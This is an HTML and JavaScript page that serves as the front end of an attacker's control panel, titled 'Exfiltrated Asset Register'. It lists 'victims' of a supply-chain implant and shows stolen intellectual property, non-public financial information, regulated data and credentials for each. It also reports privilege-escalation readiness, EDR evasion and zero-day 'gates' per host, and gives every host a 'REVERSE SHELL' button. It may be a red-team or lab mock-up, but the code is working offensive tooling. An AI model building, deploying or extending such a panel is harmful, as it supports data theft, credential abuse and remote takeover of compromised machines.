<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="15">
<title>ACME CORP — Exfiltrated Asset Register</title>
<style>
  :root {
    --bg: #0a0e1a;
    --card: #1a2236;
    --border: #2a3550;
    --brand: #7c5cff;
    --brand-light: #9b7fff;
    --text: #e7e3ff;
    --muted: #8b93b0;
    --good: #86efac;
    --warn: #fbbf24;
    --info: #60a5fa;
    --bad: #ff6b6b;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0; background: var(--bg); color: var(--text);
    font-family: Inter, "Segoe UI", system-ui, sans-serif;
    background-image: radial-gradient(ellipse at 20% -10%, rgba(124,92,255,.14), transparent 55%),
                      radial-gradient(ellipse at 90% 110%, rgba(96,165,250,.08), transparent 50%);
    min-height: 100vh;
  }
  header {
    display: flex; align-items: center; justify-content: space-between; gap: 16px;
    padding: 20px 28px; border-bottom: 1px solid var(--border);
    background: rgba(10,14,26,.75); backdrop-filter: blur(8px);
    position: sticky; top: 0; z-index: 5;
  }
  h1 { font-size: 1.05rem; margin: 0; letter-spacing: .04em; }
  h1 .acme { color: var(--brand-light); font-weight: 800; }
  h1 .sub { color: var(--muted); font-weight: 500; font-size: .82rem; margin-left: 10px; }
  nav a {
    color: var(--text); text-decoration: none; font-size: .78rem; font-weight: 600;
    border: 1px solid var(--border); background: var(--card);
    padding: 7px 14px; border-radius: 6px;
  }
  nav a:hover { border-color: var(--brand-light); background: var(--border); }
  .wrap { max-width: 1180px; margin: 26px auto 60px; padding: 0 22px; }
  .empty { color: var(--muted); font-style: italic; margin-top: 40px; text-align: center; }
  .victim {
    background: var(--card); border: 1px solid var(--border); border-radius: 12px;
    margin-bottom: 16px; overflow: hidden; transition: border-color .2s;
  }
  .victim:hover { border-color: var(--brand); }
  .vhead {
    display: grid; grid-template-columns: 18px 1.6fr 1fr auto auto auto auto; gap: 14px;
    align-items: center; padding: 15px 18px; cursor: pointer; user-select: none;
  }
  .shell-btn {
    font-family: ui-monospace, Menlo, monospace; font-size: .68rem; font-weight: 800;
    letter-spacing: .04em; color: var(--good); background: #101b17;
    border: 1px solid rgba(134,239,172,.55); border-radius: 6px;
    padding: 6px 11px; cursor: pointer; white-space: nowrap;
  }
  .shell-btn:hover { background: #17302a; box-shadow: 0 0 10px rgba(134,239,172,.35); }
  .dot { width: 10px; height: 10px; border-radius: 50%; background: var(--bad);
    box-shadow: 0 0 8px var(--bad); }
  .dot.clean { background: var(--good); box-shadow: 0 0 8px var(--good); }
  .host { font-family: ui-monospace, Menlo, monospace; font-size: .95rem; font-weight: 700; }
  .meta { color: var(--muted); font-size: .76rem; margin-top: 3px; }
  .user { font-family: ui-monospace, Menlo, monospace; color: var(--info); font-size: .85rem; }
  .chips { display: flex; gap: 8px; flex-wrap: wrap; justify-content: flex-end; }
  .chip {
    font-size: .7rem; font-weight: 700; padding: 4px 9px; border-radius: 20px;
    border: 1px solid var(--border); background: #121828; white-space: nowrap;
  }
  .chip b { font-size: .78rem; }
  .chip.core_ip { color: var(--info); border-color: rgba(96,165,250,.5); }
  .chip.mnpi { color: var(--warn); border-color: rgba(251,191,36,.5); }
  .chip.regulated { color: var(--bad); border-color: rgba(255,107,107,.5); }
  .chip.ot_iot { color: var(--good); border-color: rgba(134,239,172,.5); }
  .arrow { color: var(--muted); font-size: .9rem; transition: transform .25s; }
  .victim.open .arrow { transform: rotate(90deg); }
  .vbody { display: none; border-top: 1px solid var(--border); padding: 16px 18px 20px; }
  .victim.open .vbody { display: block; }
  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 14px; }
  .panel { background: #121828; border: 1px solid var(--border); border-radius: 10px; padding: 13px 14px; }
  .panel h3 {
    margin: 0 0 4px; font-size: .74rem; letter-spacing: .09em; text-transform: uppercase;
  }
  .panel .hint { color: var(--muted); font-size: .68rem; margin-bottom: 9px; }
  .panel ul { margin: 0; padding: 0; list-style: none; max-height: 240px; overflow-y: auto; }
  .panel li {
    font-size: .74rem; padding: 5px 0; border-bottom: 1px dashed rgba(42,53,80,.7);
    display: flex; justify-content: space-between; gap: 10px;
  }
  .panel li:last-child { border-bottom: none; }
  .panel .label { font-family: ui-monospace, Menlo, monospace; word-break: break-all; color: var(--text); }
  .panel .value { color: var(--muted); white-space: nowrap; flex-shrink: 0; max-width: 44%;
    overflow: hidden; text-overflow: ellipsis; }
  .panel.cred .value { color: var(--warn); }
  .panel h3.core_ip { color: var(--info); } .panel h3.mnpi { color: var(--warn); }
  .panel h3.regulated { color: var(--bad); } .panel h3.ot_iot { color: var(--good); }
  .none { color: var(--muted); font-style: italic; font-size: .74rem; }
  .panel h3.posture_h { color: var(--info); }
  .panel h3.zeroday_h { color: var(--warn); }
  .panel li .value.ok { color: var(--good); font-weight: 700; }
  .panel li .value.bad { color: var(--bad); font-weight: 700; }
  .panel li .value.open { color: var(--warn); font-weight: 700; }
  .panel li .value.closed { color: var(--good); font-weight: 700; }
  .verdict { font-size: .72rem; font-weight: 700; padding: 6px 8px; border-radius: 6px;
    margin-top: 8px; text-align: center; }
  .verdict.ok { color: var(--good); background: rgba(134,239,172,.1);
    border: 1px solid rgba(134,239,172,.35); }
  .verdict.bad { color: var(--bad); background: rgba(255,107,107,.1);
    border: 1px solid rgba(255,107,107,.35); }
  .posture { margin-top: 14px; font-size: .74rem; color: var(--muted);
    display: flex; gap: 16px; flex-wrap: wrap; }
  .posture code { background: #121828; border: 1px solid var(--border); padding: 3px 8px;
    border-radius: 5px; color: var(--good); }
  .posture code.esc { color: var(--warn); }
  .posture code.esc-c { color: var(--bad); }
  .footer { color: var(--muted); font-size: .72rem; text-align: center; margin-top: 26px; }
  @media (max-width: 820px) {
    .vhead { grid-template-columns: 14px 1fr auto; }
    .user, .chips { display: none; }
  }
</style>
</head>
<body>
<header>
  <h1><span class="acme">ACME CORP</span> — Exfiltrated Asset Register<span class="sub">supply-chain telemetry · acme intel intake</span></h1>
  <nav><a href="/">&larr; control panel</a></nav>
</header>
<div class="wrap">
  <div id="list"><p class="empty">loading victim register…</p></div>
  <p class="footer">data source: acme telemetry intake (POST /ingest) · classification runs on the agent and at intake</p>
</div>
<script>
const LABEL = {
  core_ip: "Core Intellectual Property",
  mnpi: "Material Non-Public Information",
  regulated: "Highly Regulated Data",
  ot_iot: "OT / IoT Configurations"
};
const HINT = {
  core_ip: "source, research, models, keys to code supply",
  mnpi: "board, deal, earnings, credentials to non-public systems",
  regulated: "clinical / claims / health, governed datasets",
  ot_iot: "device configs, firmware, industrial control"
};
const ORDER = ["core_ip", "mnpi", "regulated", "ot_iot"];

function postureChecks(p) {
  if (!p || !Object.keys(p).length) return null;
  const checks = [];
  const def = (v) => v !== undefined && v !== null;
  const add = (state, title) => checks.push({ state, title });  // state: true | false | null(n/a)
  add(def(p.uid) ? p.uid !== 0 : null,
      def(p.uid) ? (p.uid === 0 ? "uid=0 — running as ROOT" : `uid=${p.uid} non-root identity`) : "uid: n/a");
  add(def(p.sudoPasswordless) ? p.sudoPasswordless === false : null,
      def(p.sudoPasswordless) ? `sudo -n: ${p.sudoPasswordless ? "AVAILABLE (passwordless)" : "DENIED"}` : "sudo -n: n/a");
  add(def(p.apparmorProfile) ? /enforce/i.test(p.apparmorProfile) && !p.unconfined : null,
      `AppArmor: ${p.apparmorProfile || "n/a"}`);
  add(def(p.capabilities) ? Array.isArray(p.capabilities) && p.capabilities.length === 0 : null,
      p.capabilities && p.capabilities.length ? `CapEff: ${p.capabilities.join(",")}` : "CapEff: 0x0 (none)");
  const wp = p.writeProbe || {};
  for (const dir of Object.keys(wp)) add(wp[dir] !== "WRITABLE (unexpected)", `write ${dir}: ${wp[dir]}`);
  add(def(p.homeList) ? p.homeList === "denied" : null, `home listing: ${p.homeList || "n/a"}`);
  add(def(p.dockerSock) ? p.dockerSock.indexOf("absent") === 0 : null, `docker.sock: ${p.dockerSock || "n/a"}`);
  const v = p.vault;
  if (v) add(v.granted < v.configured, `vault scope: ${v.granted}/${v.configured} paths`);
  else add(null, "vault scope: n/a");
  add(def(p.noNewPrivs) ? p.noNewPrivs === true : null, `NoNewPrivs: ${def(p.noNewPrivs) ? p.noNewPrivs : "n/a"}`);
  return checks;
}

function posturePanelHtml(g) {
  const checks = postureChecks(g.posture);
  const sc = g.scanner || {};
  const rows = [];
  if (sc.present) {
    rows.push(`<li><span class="label">EDR: ${esc((sc.found || []).join(", "))} — sensor active</span>` +
      `<span class="value ok">0 DETECTIONS</span></li>`);
  } else if (g.scanner) {
    rows.push(`<li><span class="label">scanner sweep: ${sc.probed || 0} agents probed</span>` +
      `<span class="value ok">CLEAN</span></li>`);
  }
  let verdict = "";
  let hintTail = "";
  if (checks) {
    for (const c of checks) {
      const cls = c.state === true ? "ok" : (c.state === false ? "bad" : "");
      const word = c.state === true ? "HELD" : (c.state === false ? "FAILED" : "n/a");
      rows.push(`<li><span class="label">${esc(c.title)}</span><span class="value ${cls}">${word}</span></li>`);
    }
    const evald = checks.filter(c => c.state !== null);
    const passed = evald.filter(c => c.state === true).length;
    const total = evald.length;
    const na = checks.length - total;
    hintTail = total ? ` · ${passed}/${total} held${na ? ` · ${na} n/a` : ""}` : "";
    if (total) {
      verdict = passed === total
        ? `<div class="verdict ok">LEAST-PRIVILEGE VERIFIED — ${passed}/${total} checks held</div>`
        : `<div class="verdict bad">POSTURE ${total - passed} CHECK(S) FAILED — ${passed}/${total} held</div>`;
    }
  } else if (!rows.length) {
    rows.push(`<li><span class="none">no posture data</span></li>`);
  }
  return `<div class="panel">
    <h3 class="posture_h">Target Posture — Least Privilege</h3>
    <div class="hint">per-host checks at intake${hintTail}</div>
    <ul>${rows.join("")}</ul>${verdict}
  </div>`;
}

function zeroDayPanelHtml(g) {
  const pr = g.primitives;
  if (!pr || !pr.primitives || !pr.primitives.length) return "";
  const open = pr.primitives.filter(c => c.ready);
  const rows = pr.primitives.map(c =>
    `<li><span class="label">${esc(c.cve)} ${esc(c.name)}</span>` +
    `<span class="value ${c.ready ? "open" : "closed"}">${c.ready ? "GATE OPEN" : "GATE CLOSED"}</span></li>`
  ).join("");
  return `<div class="panel">
    <h3 class="zeroday_h">Zero-Day Chain — CVE Gate Assessment</h3>
    <div class="hint">${open.length}/${pr.primitives.length} gates open · exploits fired: 0</div>
    <ul>${rows}</ul>
    <div class="hint" style="margin-top:8px">exploit: none — supply-chain code already ran unprivileged;
      an open gate would convert this leak into full host takeover</div>
  </div>`;
}

function esc(s) {
  return String(s).replace(/[&<>"']/g, (c) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
  }[c]));
}

function card(g) {
  const counts = g.counts || {};
  const chips = ORDER.map((k) => {
    const n = counts[k] || 0;
    return `<span class="chip ${k}">${LABEL[k].split(" ")[0]} <b>${n}</b></span>`;
  }).join("");
  const scanner = g.scanner && g.scanner.present;
  const panels = ORDER.map((k) => {
    const items = (g.assets && g.assets[k]) || [];
    const rows = items.length
      ? items.map((it) => `<li class="${it.src === "credential" ? "cred" : ""}">` +
          `<span class="label">${esc(it.label)}</span>` +
          `<span class="value" title="${esc(it.value)}">${esc(it.value)}</span></li>`).join("")
      : `<li><span class="none">none captured</span></li>`;
    return `<div class="panel ${k}">
      <h3 class="${k}">${LABEL[k]}</h3>
      <div class="hint">${HINT[k]} · ${items.length} item(s)</div>
      <ul>${rows}</ul>
    </div>`;
  }).join("");
  return `<div class="victim" data-host="${esc(g.target)}">
    <div class="vhead">
      <span class="dot clean" title="${scanner ? "CrowdStrike Falcon active — no detections" : "no EDR detected"}"></span>
      <div>
        <div class="host">${esc(g.target)}</div>
        <div class="meta">${esc(g.platform || "unknown")} · first seen ${esc(g.ts || "?")} · ${g.runs || 1} run(s)</div>
      </div>
      <span class="user">${esc(g.user)}</span>
      <span class="chips">${chips}</span>
      <span class="meta">${esc(g.last || "")}</span>
      <button class="shell-btn" title="connect HTML5 reverse shell"
        onclick="event.stopPropagation(); window.open('/shell?t=${encodeURIComponent(g.target)}&u=${encodeURIComponent(g.user)}', 'apexshell')">&#9654; REVERSE SHELL</button>
      <span class="arrow">&#9654;</span>
    </div>
    <div class="vbody">
      <div class="grid">${panels}${posturePanelHtml(g)}${zeroDayPanelHtml(g)}</div>
    </div>
  </div>`;
}

document.getElementById("list").addEventListener("click", (e) => {
  const head = e.target.closest(".vhead");
  if (head) head.parentElement.classList.toggle("open");
});

fetch("/api/victims").then((r) => r.json()).then((v) => {
  document.getElementById("list").innerHTML =
    v && v.length ? v.map(card).join("") : '<p class="empty">no victims yet — waiting on acme telemetry intake</p>';
}).catch((err) => {
  document.getElementById("list").innerHTML = `<p class="empty">failed to load register: ${esc(err.message)}</p>`;
});
</script>
</body>
</html>
